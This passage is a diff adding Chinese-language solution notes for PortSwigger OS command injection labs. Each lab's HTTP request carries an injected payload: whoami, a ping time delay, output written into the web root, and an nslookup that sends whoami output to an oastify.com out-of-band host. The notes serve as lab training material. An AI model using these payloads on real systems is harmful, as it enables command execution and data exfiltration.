@@ -1,0 +1,43 @@
+https://portswigger.net/web-security/os-command-injection/lab-simple
+注入点为查看库存功能
+POST /product/stock HTTP/2
+
+productId=1&storeId=3
+将whoami命令前后添加分隔符并使用url编码放到storeId的值后
+productId=1&storeId=3<@burp_urlencode>& whoami  &</@burp_urlencode>
+
+
+### 时间延迟OS命令盲注 ###
+https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
+注入点为反馈表单
+POST /feedback/submit HTTP/2
+
+csrf=X&name=a&email=a%40a&subject=a&message=a
+在email参数中注入命令
+csrf=X&name=a&email=a%40a<@burp_urlencode>& ping -c 10 127.0.0.1 &</@burp_urlencode>&subject=a&message=a
+
+### 重定向OS命令盲注 ###
+https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+注入点为反馈表单
+POST /feedback/submit HTTP/2
+
+csrf=X&name=a&email=a%40aa&subject=a&message=a
+在email参数中注入命令
+csrf=X&name=a&email=a%40aa<@burp_urlencode>& whoami > /var/www/images/whoami.txt &</@burp_urlencode>&subject=a&message=a
+
+图像加载头部为
+GET /image?filename=3.jpg HTTP/2
+修改为
+GET /image?filename=whoami.txt HTTP/2
+
+
+### 带外OS命令盲注 ###
+https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+注入点为反馈表单
+POST /feedback/submit HTTP/2
+
+csrf=X&name=a&email=awe2%40aw&subject=a&message=a
+在email参数中注入命令，设置burp服务器
+@ 在unix中使用 `注入命令` 或 $(注入命令) 在原始命令中执行注入的命令 @ 
+csrf=X&name=a&email=awe2%40aw<@burp_urlencode>& nslookup `whoami`.q1s7yyf96me1ssgawfhnkrbyvp1gp7dw.oastify.com &</@burp_urlencode>&subject=a&message=a
